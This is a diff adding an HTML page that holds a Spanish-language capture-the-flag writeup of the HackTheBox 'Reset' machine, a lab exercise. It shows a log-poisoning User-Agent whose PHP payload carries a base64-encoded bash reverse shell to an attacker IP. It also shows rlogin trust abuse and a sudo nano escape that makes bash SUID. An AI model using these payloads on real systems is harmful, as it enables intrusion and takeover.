@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Reset Machine - HackTheBox · Celero0 Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CeleroRKX">
+<meta name="description" content="
+
+Tags: #Linux #LFI #nano #rlogin #LogPoisoning
+
+
+
+  Introducción
+  
+    
+    Link to heading
+  
+
+En este writeup detallaremos paso a paso la resolución de esta máquina Linux. La intrusión inicial comienza con la enumeración de un servidor web, donde lograremos saltarnos la autenticación abusando de un fallo lógico en la funcionalidad de restablecimiento de contraseña. Una vez dentro del panel administrativo, descubriremos una vulnerabilidad de Local File Inclusion (LFI), la cual transformaremos en Ejecución Remota de Comandos (RCE) mediante la clásica técnica de Log Poisoning sobre los registros de Apache.">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Reset Machine - HackTheBox">
+  <meta name="twitter:description" content="Tags: #Linux #LFI #nano #rlogin #LogPoisoning Introducción Link to heading En este writeup detallaremos paso a paso la resolución de esta máquina Linux. La intrusión inicial comienza con la enumeración de un servidor web, donde lograremos saltarnos la autenticación abusando de un fallo lógico en la funcionalidad de restablecimiento de contraseña. Una vez dentro del panel administrativo, descubriremos una vulnerabilidad de Local File Inclusion (LFI), la cual transformaremos en Ejecución Remota de Comandos (RCE) mediante la clásica técnica de Log Poisoning sobre los registros de Apache.">
+
+<meta property="og:url" content="https://celero0.github.io/posts/reset/">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Reset Machine - HackTheBox">
+  <meta property="og:description" content="Tags: #Linux #LFI #nano #rlogin #LogPoisoning Introducción Link to heading En este writeup detallaremos paso a paso la resolución de esta máquina Linux. La intrusión inicial comienza con la enumeración de un servidor web, donde lograremos saltarnos la autenticación abusando de un fallo lógico en la funcionalidad de restablecimiento de contraseña. Una vez dentro del panel administrativo, descubriremos una vulnerabilidad de Local File Inclusion (LFI), la cual transformaremos en Ejecución Remota de Comandos (RCE) mediante la clásica técnica de Log Poisoning sobre los registros de Apache.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-05-16T07:56:08+00:00">
+    <meta property="article:modified_time" content="2026-05-16T07:56:08+00:00">
+
+
+
+
+<link rel="canonical" href="https://celero0.github.io/posts/reset/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://celero0.github.io/">
+      Celero0 Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://celero0.github.io/posts/reset/">
+              Reset Machine - HackTheBox
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2026-05-16T07:56:08Z">
+                May 16, 2026
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              5-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <hr>
+<ul>
+<li>Tags: #Linux #LFI #nano #rlogin #LogPoisoning</li>
+</ul>
+<hr>
+<h1 id="introducción">
+  Introducción
+  <a class="heading-link" href="#introducci%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>En este <em>writeup</em> detallaremos paso a paso la resolución de esta máquina Linux. La intrusión inicial comienza con la enumeración de un servidor web, donde lograremos saltarnos la autenticación abusando de un fallo lógico en la funcionalidad de restablecimiento de contraseña. Una vez dentro del panel administrativo, descubriremos una vulnerabilidad de Local File Inclusion (LFI), la cual transformaremos en Ejecución Remota de Comandos (RCE) mediante la clásica técnica de <em>Log Poisoning</em> sobre los registros de Apache.</p>
+<p>El vector de escalada interna resulta especialmente interesante, combinando configuraciones <em>legacy</em> y binarios de uso diario. El movimiento lateral hacia el usuario <code>sadm</code> lo conseguiremos abusando de una relación de confianza insegura en los servicios R (<em>R-Services</em>) gracias a una mala configuración en el archivo <code>/etc/hosts.equiv</code>. Finalmente, la escalada a privilegios máximos (<code>root</code>) se logrará inspeccionando sesiones activas de <code>tmux</code> y explotando un permiso <code>sudo</code> mal configurado sobre el editor de texto <code>nano</code>, ejecutando comandos del sistema desde sus opciones internas para asignarle permisos SUID al binario <code>bash</code>.</p>
+<h1 id="enumeración-nmap">
+  Enumeración Nmap
+  <a class="heading-link" href="#enumeraci%c3%b3n-nmap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Realizamos un escaneo de los puertos, encontrando como resultado el puerto <code>80</code> abierto, que está corriendo el servicio <code>HTTP</code>, y el puerto <code>22</code> corriendo <code>SSH</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.11.233 -oG allPorts
+</span></span></code></pre></div><p>Encontrando los siguientes puertos abiertos</p>
+<img src="/images/Pasted image 20260516022318.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora, si realizamos un escaneo por las versiones de estos puertos, con el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,80,512,513,514 -sCV 10.129.33.161 -oN portServices
+</span></span></code></pre></div><p>Obtenemos el resultado de a continuación</p>
+<img src="/images/Pasted image 20260516022531.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Como información relevante, tenemos lo siguiente</p>
+<ul>
+<li>512/tcp (rexec): Permite la ejecución remota de comandos.</li>
+<li>513/tcp (rlogin): Permite el inicio de sesión remoto.</li>
+<li>514/tcp (rsh): Shell remota.</li>
+</ul>
+<h1 id="enumeración-http">
+  Enumeración HTTP
+  <a class="heading-link" href="#enumeraci%c3%b3n-http">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Comenzamos enumerando el puerto <code>HTTP</code>. Al entrar en la aplicación web, encontramos una página de login.</p>
+<img src="/images/Pasted image 20260516023139.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Como no tenemos credenciales válidas, y como tampoco funcionan las credenciales típicas, nos centraremos en la función <code>Forgot Password?</code></p>
+<p>Vemos que esta función nos solicita un nombre de usuario. Si escribimos uno que no existe, nos aparece el siguiente mensaje</p>
+<img src="/images/Pasted image 20260516023427.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Pero al colocar un usuario válido, nos muestra que se ha reiniciado su contraseña</p>
+<img src="/images/Pasted image 20260516023457.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por lo cual tenemos una vía para enumerar usuarios. Para entender mejor el funcionamiento del reinicio de contraseña, interceptaremos la petición con <code>Burpsuite</code></p>
+<p>Tenemos que la petición que mandamos es la siguiente</p>
+<img src="/images/Pasted image 20260516023812.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Al enviarla encontramos que se genera una contraseña nueva</p>
+<img src="/images/Pasted image 20260516023829.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Utilizamos la contraseña obtenida para loguearnos en la página web</p>
+<img src="/images/Pasted image 20260516023917.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Vemos que son válidas, entrando al <code>dashboard</code> como el usuario <code>admin</code></p>
+<img src="/images/Pasted image 20260516024425.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>En teoría la aplicación web debería permitirnos leer el archivo de <code>syslog</code>, pero no nos muestra nada</p>
+<img src="/images/Pasted image 20260516024722.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si interceptamos la petición, tenemos lo siguiente</p>
+<img src="/images/Pasted image 20260516024749.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Vemos que está accediendo al recurso <code>/var/log/syslog</code>, pero la web no nos muestra el resultado, por lo cual probaremos ver otros archivos</p>
+<h1 id="explotando-lfi">
+  Explotando LFI
+  <a class="heading-link" href="#explotando-lfi">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Como la página nos permite ver archivos de <code>logs</code>, un archivo interesante a la hora de realizar un <code>LFI</code> es <code>/var/log/apache2/access.log</code></p>
+<p>Por lo tanto mandaremos la siguiente petición</p>
+<img src="/images/Pasted image 20260516025207.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Obteniendo como respuesta el contenido del archivo, confirmando la vulnerabilidad <code>LFI</code></p>
+<img src="/images/Pasted image 20260516025228.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="log-poisoning">
+  Log Poisoning
+  <a class="heading-link" href="#log-poisoning">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Como tenemos capacidad de lectura del archivo de <code>logs</code> de apache, y además, lo podemos leer mediante un archivo <code>.php</code>, podemos intentar insertar código en <code>PHP</code> para conseguir una <code>reverse shell</code></p>
+<p>Para ello, primeramente utilizaremos <code>Penelope</code>, para obtener nuestro payload de <code>reverse shell</code></p>
+<img src="/images/Pasted image 20260516025732.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Posteriormente creamos un archivo que contenga el <code>User-Agent</code> malicioso</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo -n <span style="color:#a5d6ff">&#34;User-Agent: &lt;?php system(&#39;printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTUuNTUvNDQ0NCAwPiYxKSAm|base64 -d|bash&#39;); ?&gt;&#34;</span> &gt; Poison
+</span></span></code></pre></div><p>y con el siguiente comando, enviamos la petición</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s <span style="color:#a5d6ff">&#34;http://10.129.33.161/dashboard.php&#34;</span> -H @Poison
+</span></span></code></pre></div><img src="/images/Pasted image 20260516025926.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora si desde <code>Burpsuite</code> volvemos a mandar la petición anterior <code>file=%2Fvar%2Flog%2Fapache2%2Faccess.log</code>, obtenemos nuestra shell</p>
+<img src="/images/Pasted image 20260516030115.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="movimiento-lateral">
+  Movimiento lateral
+  <a class="heading-link" href="#movimiento-lateral">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Si vamos a <code>/home/sadm</code> encontramos la <code>user.txt</code>; además, vemos un archivo <code>.rhosts</code></p>
+<img src="/images/Pasted image 20260516030517.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Enumerando el sistema nos encontramos con los siguientes archivos interesantes</p>
+<img src="/images/Pasted image 20260516030559.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Encontramos el archivo <code>/etc/hosts.equiv</code> el cual es un archivo de confianza usado por servicios como <code>rsh</code>, <code>rlogin</code> y <code>rexec</code> que define qué hosts remotos pueden autenticarse sin pedir contraseña para ciertos usuarios, como aparece aquí</p>
+<img src="/images/Pasted image 20260516031623.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Para mayor información tenemos lo siguiente: <a href="https://docs.oracle.com/cd/E19455-01/805-7229/remotehowtoaccess-36082/index.html"  class="external-link" target="_blank" rel="noopener">https://docs.oracle.com/cd/E19455-01/805-7229/remotehowtoaccess-36082/index.html</a></p>
+<p>El archivo indica una relación de confianza para el usuario <code>sadm</code>, lo que potencialmente permitiría autenticación remota sin contraseña mediante servicios <code>r*</code> (<code>rsh</code>, <code>rlogin</code>, etc.).</p>
+<img src="/images/Pasted image 20260516031843.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Como vimos en el escaneo inicial, estos servicios se encuentran disponibles en la máquina víctima, por lo cual procederemos a crear el usuario <code>sadm</code>, en nuestro host atacante, y nos conectaremos por <code>rsh</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>useradd sadm
+</span></span><span style="display:flex;"><span>passwd sadm
+</span></span></code></pre></div><img src="/images/Pasted image 20260516032138.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora debemos cambiarnos al usuario <code>sadm</code> con el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su sadm
+</span></span></code></pre></div><p>Y desde el usuario <code>sadm</code> realizaremos el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rlogin 10.129.33.161 -l sadm
+</span></span></code></pre></div><p>Consiguiendo una consola interactiva</p>
+<img src="/images/Pasted image 20260516032626.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="escalada-de-privilegios">
+  Escalada de privilegios
+  <a class="heading-link" href="#escalada-de-privilegios">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Buscando por los procesos que se ejecutan en el sistema víctima, tenemos una sesión activa de <code>tmux</code></p>
+<img src="/images/Pasted image 20260516033039.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si ejecutamos el comando <code>tmux ls</code>, tenemos lo siguiente</p>
+<img src="/images/Pasted image 20260516033105.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Como vemos que la sesión existe , intentamos conectarnos a ella</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tmux attach -t sadm_session
+</span></span></code></pre></div><p>y tenemos lo siguiente</p>
+<img src="/images/Pasted image 20260516033210.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Si revisamos los permisos de sudoers, obtenemos lo siguiente</p>
+<img src="/images/Pasted image 20260516033426.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Lo más importante es que podemos utilizar <code>nano</code> con privilegios <code>sudo</code> para modificar el archivo <code>/etc/firewall.sh</code></p>
+<p>Podemos abusar de este privilegio para ejecutar comandos como <code>root</code> de la siguiente forma</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/bin/nano /etc/firewall.sh
+</span></span></code></pre></div><img src="/images/Pasted image 20260516033703.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora, si presionamos <code>CTRL + T</code>, podemos ejecutar comandos</p>
+<img src="/images/Pasted image 20260516033725.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ejecutaremos el comando <code>chmod u+s /bin/bash</code></p>
+<img src="/images/Pasted image 20260516033837.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora si ejecutamos el siguiente comando, obtendremos privilegios <code>root</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -p
+</span></span></code></pre></div><img src="/images/Pasted image 20260516033922.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por lo cual podemos leer la <code>root.txt</code>, y logramos obtener control total sobre la máquina víctima</p>
+<img src="/images/Pasted image 20260516033957.png" style="width:100%; height:auto; display:block; margin:auto;">
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     CeleroRKX 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
